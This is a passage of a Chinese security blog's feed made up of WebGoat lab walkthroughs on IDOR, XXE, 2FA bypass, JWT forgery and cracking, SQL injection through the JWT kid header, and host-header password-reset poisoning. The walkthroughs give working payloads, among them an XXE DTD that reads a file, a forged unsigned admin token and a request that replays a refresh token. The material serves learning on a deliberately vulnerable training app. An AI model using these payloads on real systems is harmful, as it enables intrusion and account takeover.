&quot;application/json&quot;</code>：表示这个方法返回的响应内容类型是JSON格式。</li></ul><p>这里看起来user类把RequestBody数据进行了一个类型转换然后保存新生成的user，那么只要知道user类有哪些属性就可以新建一个user对象，而user的属性按照我们之前的到的信息似乎只能创建一个普通用户：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126539.png" alt="image-20231123175903217"></p><p>但是到了这里，是不是发现了另一个IDOR？也就是这个role：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126540.png" alt="image-20231123180034526"></p><p>这就很nice了，终于把这条思路走通了</p><p>这里还要再深挖一下为什么是这样？</p><p>通过关键字role全局搜索一下，然后找到了这个</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126541.png" alt="image-20231123181632640"></p><p>可以看到，它并不是lesson中的javabean</p><p>我们回想一下，我们访问的是根目录下的user页面而不是子目录的某个lesson的页面，因此这里的user可能不是这个org.owasp.webgoat.lessons.missingac.User.java</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126542.png" alt="image-20231123181421895"></p><p>此时我们再看</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126543.png" alt="image-20231123182427749"></p><p>这个userrepo：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126544.png" alt="image-20231123182712982"></p><p>继续跟进去</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126545.png" alt="image-20231123182854157"></p><p>发现它是从数据库动态查询用户数据</p><p>但是这个数据库是这个题目的独立数据库还是整个项目用来储存实际用户比如我（water3666）？继续跟进发现有点过于复杂了，但是这里已经说明了数据是来自哪里了：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126546.png" alt="image-20231123183252707"></p><p>当时没反应过来，如果是题目的数据库，应该是tom或者jerry，或者根本没有独立的数据库，至于如何封装到题目的user的，就先不挖了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;IDOR-2&quot;&gt;&lt;a href=&quot;#IDOR-2&quot; class=&quot;headerlink&quot; title=&quot;IDOR-2&quot;&gt;&lt;/a&gt;IDOR-2&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;许多访问控制问题容易受到经过身份验证但未经授权的用户的攻击。因此，让我们从合法身份</summary>
      
    
    
    
    
    <category term="WebGoat" scheme="https://taninluv.github.io/tags/WebGoat/"/>
    
    <category term="代码审计" scheme="https://taninluv.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="IDOR" scheme="https://taninluv.github.io/tags/IDOR/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat-XXE</title>
    <link href="https://taninluv.github.io/2023/11/23/WebGoat-XXE/"/>
    <id>https://taninluv.github.io/2023/11/23/WebGoat-XXE/</id>
    <published>2023-11-23T01:31:58.000Z</published>
    <updated>2023-11-23T04:40:51.885Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于xml、DTD"><a href="#关于xml、DTD" class="headerlink" title="关于xml、DTD"></a>关于xml、DTD</h1><p><a href="https://drun1baby.top/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/">从0到1完全掌握XXE | Drunkbaby’s Blog (drun1baby.top)</a></p><h1 id="XXE-4"><a href="#XXE-4" class="headerlink" title="XXE-4"></a>XXE-4</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240626.png" alt="image-20231123095315742"></p><p>这道题是标准的xxe注入，这里不多赘述，主要看看源码探究一下漏洞是如何导致的：</p><p>这里需要补充一个知识点：</p><p><a href="https://juejin.cn/post/6844903704085299214">组件使用总结：使用 JAXB 实现 XML文件和java对象互转 - 掘金 (juejin.cn)</a></p><p>关键点就是：<strong>当把 XML 格式的字符串传递给 Unmarshaller 接口转变成 Java 对象时，会解析一遍 XML，如果传入的值可控就会导致 XXE 注入攻击。</strong></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240627.png" alt="image-20231123102310270"></p><p>这道题实际是看返回的路径中是否包含系统的敏感路径，包含则为成功，这里真正引发xxe的点在parseXml中，我们进去看一看：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240628.png" alt="image-20231123102520735"></p><p>结合前面补充的知识，我们知道他进行了一次反序列化，将xml解析成java对象（这里是comment），解析过程中，就触发了我们的payload（这里是file:&#x2F;&#x2F;&#x2F;读取根目录）</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="https://drun1baby.top/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/">WebGoat代码审计-05-XXE注入 | Drunkbaby’s Blog (drun1baby.top)</a></p><blockquote><p>产生 XXE 注入是因为解析 XML 时不加任何的限制，那么我们的修复手段讲将支持外部实体和支持dtd都给禁止便可。</p></blockquote><h1 id="XXE-7"><a href="#XXE-7" class="headerlink" title="XXE-7"></a>XXE-7</h1><blockquote><p>现代REST框架 在现代REST框架中，服务器可能能够接受您作为开发人员没有想到的数据格式。因此，这可能会导致JSON端点容易受到XXE攻击。 同样的练习，但尝试执行和第一次作业中相同的XML注入。</p></blockquote><p>根据描述来看，这可能受到修改Content-Type导致的注入攻击，就像文件上传的一些文件格式的绕过一样.</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240629.png" alt="image-20231123104701691"></p><p>还是要看看源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240630.png" alt="image-20231123105220095"></p><p>又是parseXml，倒也没什么好说的了</p><p>但是这种注入方式有一个问题：我们怎么知道目标是封装在什么类中（这里是封装在comment类中）</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240632.png" alt="image-20231123105753426"></p><p>我们可以看到，我们随意封装到一个对象中，是无法成功解析的，要进行这样的攻击需要了解额外的信息，在一开始的json字符中，我们能知道的仅仅是输入的内容属于“text”字段：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240633.png" alt="image-20231123110003923"></p><h1 id="XXE-DDOS"><a href="#XXE-DDOS" class="headerlink" title="XXE DDOS"></a>XXE DDOS</h1><p><a href="https://en.wikipedia.org/wiki/Billion_laughs_attack">Billion laughs attack - Wikipedia</a></p><h1 id="XXE-11-blind"><a href="#XXE-11-blind" class="headerlink" title="XXE-11 blind"></a>XXE-11 blind</h1><p>这里需要补充一些东西：</p><p><a href="https://drun1baby.top/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/">从0到1完全掌握XXE | Drunkbaby’s Blog (drun1baby.top)</a></p><blockquote><p><strong>参数实体：</strong></p><p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且只能在 DTD 中使用 <code>%实体名;</code> 引用</p><p>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体</p><p>(3)和通用实体一样，参数实体也可以外部引用</p></blockquote><blockquote><p>在某些情况下，您将看不到任何输出，因为尽管您的攻击可能已经奏效，但该字段并没有反映在页面的输出中。或者您试图读取的资源包含非法的XML字符，这会导致解析器失败。</p></blockquote><p>这道题需要通过xxe读取<code>/home/webgoat/.webgoat-8.1.0//XXE/secret.txt</code>这个文件</p><p>还是先读一下源码吧：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240634.png" alt="image-20231123111923003"></p><p>主要是一些判定语句和触发xxe的parseXml方法，然后没有抛出erro，我们看一下之前的：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240635.png" alt="image-20231123112153350"></p><p>这里没有抛出异常，所以没有回显，需要盲注</p><p>eval.dtd:</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///home/webgoat/.webgoat-8.1.0//XXE/secret.txt&quot;&gt;</code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240107.png" alt="image-20231123120256707"></p><p>此时刷新页面：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240636.png" alt="image-20231123120314497"></p><p>这里已经都出来了，不知道为啥回显说不对。</p><p>这里还要考虑一个问题，就是当comment也不显示的时候，此时我们需要消息外带，此时需要多个dtd协同：</p><p>但是这里主要研究代码审计，不多解释：</p><p><a href="https://blog.csdn.net/weixin_44420143/article/details/118721145">XXE知识总结，有这篇就够了！-CSDN博客</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;关于xml、DTD&quot;&gt;&lt;a href=&quot;#关于xml、DTD&quot; class=&quot;headerlink&quot; title=&quot;关于xml、DTD&quot;&gt;&lt;/a&gt;关于xml、DTD&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/04/19/</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://taninluv.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="webGoat" scheme="https://taninluv.github.io/tags/webGoat/"/>
    
    <category term="XXE" scheme="https://taninluv.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat-Authentication_Bypasses_1</title>
    <link href="https://taninluv.github.io/2023/11/19/WebGoat-Authentication-Bypasses/"/>
    <id>https://taninluv.github.io/2023/11/19/WebGoat-Authentication-Bypasses/</id>
    <published>2023-11-19T01:56:25.000Z</published>
    <updated>2023-11-23T01:54:00.417Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2FA"><a href="#2FA" class="headerlink" title="2FA"></a>2FA</h1><p>这道题他先给了一个例子，<a href="https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass">https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass</a></p><p>是一个绕过PayPal 2FA的案例，案例中把认证的问题字段抓包删除之后发送直接绕过了验证。</p><span id="more"></span><p>照着这个思路做他给的这道题，直接删除字段好像不行，我们先审计一下源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191024345.png" alt="image-20231119102436245"></p><p>可以看到，想要返回success，需要<code>verificationHelper.didUserLikelylCheat((HashMap) submittedAnswers)</code></p><p>返回False，然后<code>verificationHelper.verifyAccount(Integer.valueOf(userId), (HashMap) submittedAnswers)</code>为True，跟进这两个函数看一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191028892.png" alt="image-20231119102805345"></p><p>想要<code>didUserLikelylCheat</code>返回0，不能提交正确的答案，他这道题就是让我们必须绕过验证，他这里检查的作弊应该是直接用源码里的验证答案~到这里删除包里的答案字段应该是可以行得通的，继续往下看为什么不可以：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191115968.png" alt="image-20231119103208557"></p><p>想要<code>verifyAccount</code>返回1，对于map的size()方法是返回键值对的个数，这里他检测了输入的键值对数量是否和答案的键值对数量是否相同，因此不能直接删除包里的答案字段了，后面两个if是检测输入的值和答案相同，最终返回true。</p><p>目前看来，我们必须输入两个答案字段（两个键值对），并且必须携带错误的答案绕过作弊检测，输入正确的答案绕过身份验证，看起来好像很矛盾，但是如果我们的键没有他要检测的这两个键就可以直接绕过身份验证的if检测：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191118060.png" alt="image-20231119111849009"></p><p>但是似乎回显并不正确？看一看键值对怎么传进去的：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191116440.png" alt="image-20231119111637385"></p><p>原来是需要包含secQuestion字段的键，但是str.contains()方法是检测子句是否包含，也就是说我们传入包含键名secQuestion字段的键就可以了，比如secQuestiona、secQuestionb：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191119655.png" alt="image-20231119111925607"></p><p>通过辣：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191119526.png" alt="image-20231119111939481"></p><h1 id="JWT-4"><a href="#JWT-4" class="headerlink" title="JWT-4"></a>JWT-4</h1><p>关于jwt不再赘述，这里先看题</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311200947836.png" alt="image-20231120094744680"></p><p>这里让修改账户的jwt使之成为管理员用户，然后投票，先抓包看看：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311200949474.png" alt="image-20231120094958421"></p><p>与此同时，我们还看见了access_token&#x3D;””，很奇怪：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311200957608.png" alt="image-20231120095737558"></p><p>看见了jwt，但是不知道如何判定身份，进入源码审计一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311200959298.png" alt="image-20231120095943236"></p><p>这里大致看得出来是通过<code>admin</code>把作为身份判定的关键字，这里可以构造</p><pre><code>&quot;adimn&quot;:&quot;true&quot;</code></pre><p>isadmin因为是bool类型，直接传入True,发现验证还是没通过，找一下这个access_token:</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110366.png" alt="image-20231120101425320"></p><p>先看到如果user的值包含在vaildUsers中，就会加入非admin的jwt，否则判定为未认证，再往下看：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110368.png" alt="image-20231120101953066"></p><p>从这一段看accessToken不能为空，否则会被限制为guest，与此同时user值不能为Guset，也不是vaildUser的子段。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110369.png" alt="image-20231120102425875"></p><p>跟之前差不多，似乎只要不为空即可</p><p>但是又发现：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110370.png" alt="image-20231120103450762"></p><p>400了，看了一下路由，发现是提交到refresh的，到这段路由看一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110371.png" alt="image-20231120104224931"></p><p>发现虽然没有解析admin，但也不至于报错，而且required &#x3D; false？仔细检查发现json不同键值对之间要用<code>,</code>间隔~</p><p>修改后发现：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110372.png" alt="image-20231120104401256"></p><p>这里应该生成token，这道题的入口应该不在这里，因为根据这段路由来看我们无法自建用户和密码通过验证，最终导致UNAUTHORIZED</p><p>其实目前看来，需要找传到这段路由的数据然后修改包：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110374.png" alt="image-20231120104700675"></p><p>然后抓到了这个包：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110375.png" alt="image-20231120104828334"></p><p>但是发现不行，突然发现有一个切换用户的地方，笑死，还是太急躁了，没有好好检查页面就开始乱审计，先点击切换用户登录，这时候就可以点击重置投票的按钮了：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110376.png" alt="image-20231120152102403"></p><p>这里还是得用专门的网站，不然解码有乱码，修改后加密发送很可能出问题：<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110377.png" alt="image-20231120110120545"></p><p>这里有一个坑，题目是没有签名的，所以把header和payload贴过去就可以了，后面蓝色部分是网站初始化生成的，不是我们需要的，所以我的最终payload是：</p><pre><code>eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3MDEzMjg0ODksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.</code></pre><h1 id="JWT-5"><a href="#JWT-5" class="headerlink" title="JWT-5"></a>JWT-5</h1><p>这题是jwt破解，找个工具用rockyou.txt跑一下就可以了,要把exp时间戳修改到未过期的时间</p><h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><p>他这里提到了一个无状态会话：</p><pre><code>&#123;    &quot;token_type&quot;:&quot;bearer&quot;,    &quot;access_token&quot;:&quot;XXXX.YYYY.ZZZZ&quot;,    &quot;expires_in&quot;:10,    &quot;refresh_token&quot;:&quot;4a9a0b1eac1a34201b3c5659944e8b7&quot;&#125;</code></pre><p>原文：</p><blockquote><p>正如你所看到的，刷新令牌是一个随机字符串，服务器可以跟踪它（在内存或数据库中），以便将刷新令牌与授予刷新令牌的用户相匹配。因此，在这种情况下，只要访问令牌仍然有效，我们就可以称之为“无状态”会话，服务器端就没有设置用户会话的负担，令牌是自包含的。当访问令牌不再有效时，服务器需要查询存储的刷新令牌，以确保该令牌不会以任何方式被阻止。 每当攻击者持有访问令牌时，该令牌仅在一定时间内有效（例如10分钟）。然后，攻击者需要刷新令牌来获取新的访问令牌。这就是为什么刷新令牌需要更好的保护。也可以使刷新令牌无状态，但这意味着查看用户是否吊销了令牌将变得更加困难。服务器完成所有验证后，必须向客户端返回一个新的刷新令牌和一个新访问令牌。客户端可以使用新的访问令牌来进行API调用。</p></blockquote><p>看起来jwt只给了一个10分钟但是我们不知道是什么时候开始什么时候结束</p><p>原文：</p><blockquote><p>你应该检查什么？ </p><p>无论选择哪种解决方案，都应该在服务器端存储足够的信息，以验证用户是否仍然可信。你可以考虑很多事情，比如存储ip地址，跟踪刷新令牌的使用次数（在访问令牌的有效时间窗口中多次使用刷新令牌可能表明有奇怪的行为，你可以撤销所有令牌，让用户再次进行身份验证）。还要跟踪哪个访问令牌属于哪个刷新令牌，否则攻击者可能会使用攻击者的刷新令牌为其他用户获取新的访问令牌（请参阅<a href="https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/%E5%86%99%E4%B8%80%E7%AF%87%E5%85%B3%E4%BA%8E%E8%BF%99%E7%A7%8D%E6%94%BB%E5%87%BB%E6%98%AF%E5%A6%82%E4%BD%95%E8%BF%90%E4%BD%9C%E7%9A%84%E5%A5%BD%E6%96%87%E7%AB%A0%EF%BC%89%E6%AD%A4%E5%A4%96%EF%BC%8C%E6%A3%80%E6%9F%A5%E7%94%A8%E6%88%B7%E7%9A%84ip%E5%9C%B0%E5%9D%80%E6%88%96%E5%9C%B0%E7%90%86%E4%BD%8D%E7%BD%AE%E4%B9%9F%E6%98%AF%E4%B8%80%E4%BB%B6%E5%A5%BD%E4%BA%8B%E3%80%82%E5%A6%82%E6%9E%9C%E6%82%A8%E9%9C%80%E8%A6%81%E5%8F%91%E6%94%BE%E6%96%B0%E7%9A%84%E4%BB%A4%E7%89%8C%EF%BC%8C%E8%AF%B7%E6%A3%80%E6%9F%A5%E4%BD%8D%E7%BD%AE%E6%98%AF%E5%90%A6%E4%BB%8D%E7%84%B6%E7%9B%B8%E5%90%8C%EF%BC%88%E5%A6%82%E6%9E%9C%E4%B8%8D%E6%92%A4%E9%94%80%E6%89%80%E6%9C%89%E4%BB%A4%E7%89%8C%E5%B9%B6%E8%AE%A9%E7%94%A8%E6%88%B7%E5%86%8D%E6%AC%A1%E8%BF%9B%E8%A1%8C%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%EF%BC%89%E3%80%82">https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/写一篇关于这种攻击是如何运作的好文章）此外，检查用户的ip地址或地理位置也是一件好事。如果您需要发放新的令牌，请检查位置是否仍然相同（如果不撤销所有令牌并让用户再次进行身份验证）。</a></p></blockquote><ul><li>储存ip</li><li>跟踪刷新令牌次数</li><li>跟踪哪个访问令牌属于哪个刷新令牌</li></ul><p>原文：</p><blockquote><p>需要刷新令牌 在现代单页应用程序（SPA）中使用刷新令牌有意义吗？</p><p>正如我们在关于存储令牌的部分中所看到的，有两种选择：网络存储或cookie，这意味着刷新令牌就在访问令牌旁边，因此如果访问令牌被泄露，刷新令牌也可能被泄露。当然，大多数时候都是有区别的。访问令牌是在您进行API调用时发送的，刷新令牌仅在应该获得新的访问令牌时发送，在大多数情况下，该访问令牌是不同的端点。如果您最终在同一台服务器上，您可以选择只使用访问令牌。 如上所述，使用访问令牌和单独的刷新令牌为服务器提供了一些优势，使其不必反复检查访问令牌。仅当用户需要新的访问令牌时才执行检查。当然，只使用访问令牌是可能的。在服务器上，您存储的信息与为刷新令牌存储的信息完全相同，请参阅上一段。通过这种方式，您每次都需要检查令牌，但根据应用程序的不同，这可能是合适的。在存储刷新令牌以进行验证的情况下，保护这些令牌也很重要（至少使用哈希函数将它们存储在数据库中）。 JWT是个好主意吗？ 有很多可用的资源对使用JWT令牌进行Cookie的客户端到服务器身份验证的用例提出了质疑。使用JWT令牌的最佳位置是服务器与服务器之间的通信。在普通的web应用程序中，您最好使用普通的旧cookie。有关详细信息，请参阅：</p><ul><li><a href="http://cryto.net/~joepie91/blog/2016/06/13/stop-using-jwt-for-sessions/">stop-using-jwt-for-sessions</a></li><li><a href="http://cryto.net/~joepie91/blog/2016/06/19/stop-using-jwt-for-sessions-part-2-why-your-solution-doesnt-work/">stop-using-jwt-for-sessions-part-2-why-your-solution-doesnt-work</a></li></ul></blockquote><ul><li>访问令牌泄露和刷新令牌泄露大多数时候是有区别的</li><li>使用JWT令牌的最佳位置是服务器与服务器之间的通信</li></ul><p>可能翻译有点问题，后面或许会单独开一篇研究上面提到的文章链接</p><h1 id="jwt-7"><a href="#jwt-7" class="headerlink" title="jwt-7"></a>jwt-7</h1><p>这题先给了一个案例<a href="https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/">here</a>，大概是刷新令牌没有和访问令牌或者用户绑定，我可以用自己的刷新令牌刷新别人的令牌，大概过程是</p><pre><code>&#123;&quot;code&quot;:0,&quot;data&quot;:&#123;&quot;access_token&quot;:&quot;XXX.YYY.ZZZ&quot;,&quot;access_token_expiration&quot;:&quot;Thursday, November 9th, 2017, 10:27:33 PM&quot;,&quot;refresh_token&quot;:&quot;ABC123&quot;&#125;&#125;</code></pre><p>这里收到了一个刷新令牌”refresh_token”:”ABC123”</p><p>然后发送</p><pre><code>POST /auth/refresh HTTP/1.1Host: auth.example.comContent-Type: application/jsonAuthorization: Bearer XXX.YYY.ZZZ&#123;&quot;refresh_token&quot;:&quot;ABC123&quot;&#125;</code></pre><p>最终收到了新的令牌</p><p>然后回到这道题：From a breach of last year the following logfile is available <a href="http://172.20.10.3:8080/WebGoat/images/logs.txt">here</a> Can you find a way to order the books but let <strong>Tom</strong> pay for them?</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110378.png" alt="image-20231120163752336"></p><p>我们先点击链接看看日志里面有一个token，解密得到：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110379.png" alt="image-20231120164041633"></p><p>但是我们并没有得到刷新令牌之类的，还是审计一下源码。</p><p>有了之前的经验，这次直接找到提交的路由先进行审计：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110380.png" alt="image-20231120165855282"></p><p>总的来说，需要创建一个header为Authorization，然后把字符串<code>Bearer </code>(这里字符串后面有一个空格)替换为空，不知道是不是必要的（后来抓包发现是自带的），处理后的字符串进行了jwt解析，也就是说传入的数据是这样的（看了wp然后又审了一遍才反应过来的，又学到了hh）：</p><pre><code>Authorization:  Bearer &#123;JWT&#125; </code></pre><p>   然后要user值为Tom，至于alg是否置空似乎都可以success</p><p>再看看刷新token部分：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110381.png" alt="image-20231120170427057"></p><p>和上面重叠的比较多，这里需要user和refreshToken都不为空，refreshToken来自我们传入的请求体，是一个json，也就是jwt，同时他要存在于validRefreshTokens，追一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110382.png" alt="image-20231120170914764"></p><p>这里发现是20个随机字母，这里他或许会自己生成</p><p>当然这些只是顺带看一眼，我们按照之前log拿到的JWT，修改一下时间戳，发送试试：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110383.png" alt="image-20231120172549432"></p><p>ok了</p><h1 id="jwt-8"><a href="#jwt-8" class="headerlink" title="jwt-8"></a>jwt-8</h1><p>这道题很奇怪，源码中找不到对应的路由，但是其对应的源码应该就是这一段：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110384.png" alt="image-20231121095746850"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110385.png" alt="image-20231121100034949"></p><p>这里看起来有一个很明显的sql注入，大概逻辑是header中传入一个kid然后与数据库比对，返回查询结果 ；然后payload中的username为Tom即可success，尝试：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110386.png" alt="image-20231121102201508"></p><p>发现返回“Not a valid JWT token”，再审审：</p><p>这里存在一个jwt解析器，之前没看明白：</p><p><a href="https://www.jianshu.com/p/6bfeb86885a3">JJWT使用笔记（二）—— JWT token的解析 - 简书 (jianshu.com)</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110387.png" alt="image-20231121103952935"></p><p>这个解析器可以发现我的jwt没签名，因此返回错误，但是我怎么知道签名呢？看</p><p>这个setSigningKeyResolver</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110388.png" alt="image-20231121104250134"></p><p>他这里跟示例不一样，使用了一个获取器里包含箭头函数，应该是特定用法，用于动态获取SigningKey，暂不深究语法。然后是sql查询根据kid找到对应的SigningKey，并进行了base64解码，为什么要解码呢？因为查询出来的SigningKey应该是base64加密的，此时我们让kid查询返回为空，然后union插入一段base64加密后的字段（SigningKey），那么我们就可以控制SigningKey了</p><pre><code>water3 =&gt; d2F0ZXIz</code></pre><p>这里有个小坑：</p><p>看着时post发包下意识使用<code>#</code>注释，但是这里可能上下文不支持服务器会出错，需要使用<code>--</code>来注释：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110389.png" alt="image-20231121110851500"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110390.png" alt="image-20231121110909467"></p><p>ok了</p><h1 id="Password-reset-6"><a href="#Password-reset-6" class="headerlink" title="Password reset-6"></a>Password reset-6</h1><p>这里让我们想办法重置Tom的密码，我们先点击忘记密码，然后输入tom的邮箱发送验证，这里抓包看一下路由，然后进入相应的源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311230953818.png" alt="image-20231121195551566"></p><p>我们发现这里挺奇怪的，包头的host如果发生变化，他就尝试发送邮件。这里有个坑就是这种写法是为了信息不出网和配合webwolf使用 ，可能更多的是让我们体验一下吧？</p><p>这里我们修改host的端口到webwolf，也就是9090，响应将把带着重置链接的邮件发送到9090端口，这时我们查看9090接收到request就能拿到Tom的重置链接。</p><p>这里有个两个问题：</p><p>修改了host端口为什么还能被我们的后端（服务器）正确响应并发送邮件？</p><blockquote><p>这是因为spring的基于路径匹配的路由，不管host是什么，只有主机收到如何路径的url，就会触发该路由的解析，因此修改了端口也能正常发包。当然这里也可以可以使用 <code>application.properties</code> 或 <code>application.yml</code> 文件来配置端口号和路由绑定，但是这道题的路由显然没有~</p></blockquote><p>如果修改了host地址为与url不匹配的其他主机？</p><blockquote><p>这类请求常常被称为跨域请求（Cross-Origin Request）。</p><p>在浏览器中，跨域请求可能会受到同源策略（Same-Origin Policy）的限制，不允许从一个源（域、协议、端口）向另一个源发送 AJAX 请求。但是在服务器端，使用 Python 的 <code>requests</code> 库发送请求时，一般不会受到同源策略的限制。</p><p>但需要注意的是，在某些情况下，服务器端也可能会对请求进行同源检查或设置跨域请求的限制，这取决于服务器端的配置。例如，服务器可能会使用 CORS（跨域资源共享）来控制是否允许跨域请求。</p></blockquote><p>然后我们拿到了重置链接：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311230953820.png" alt="image-20231121201732672"></p><p>然后把host改为修改前的xxxx:8080,此时显示404，我们按照正常流程重置自己密码走一遍，发现路径少了一个WebGoat,可能时这个版本没有把8080的默认路由绑定到WebGoat，所以要手动添加一下：</p><pre><code>http://172.20.10.3:8080/WebGoat/PasswordReset/reset/reset-password/55af2d7b-c49b-43c3-8d62-a2110385036b</code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311230953821.png" alt="image-20231121202403643"></p><p>重置一下就ok了</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2FA&quot;&gt;&lt;a href=&quot;#2FA&quot; class=&quot;headerlink&quot; title=&quot;2FA&quot;&gt;&lt;/a&gt;2FA&lt;/h1&gt;&lt;p&gt;这道题他先给了一个例子，&lt;a href=&quot;https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass&quot;&gt;https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;是一个绕过PayPal 2FA的案例，案例中把认证的问题字段抓包删除之后发送直接绕过了验证。&lt;/p&gt;</summary>
    
    
    
    
    <category term="WebGaot" scheme="https://taninluv.github.io/tags/WebGaot/"/>
    
    <category term="代码审计" scheme="https://taninluv.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="2FA" scheme="https://taninluv.github.io/tags/2FA/"/>
    
    <category term="jwt" scheme="https://taninluv.github.io/tags/jwt/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat-Sql</title>
    <link href="https://taninluv.github.io/2023/11/18/WebGoat-Sql/"/>
    <id>https://taninluv.github.io/2023/11/18/WebGoat-Sql/</id>
    <published>2023-11-18T07:12:02.000Z</published>
    <updated>2023-11-18T08:25:00.967Z</updated>
    
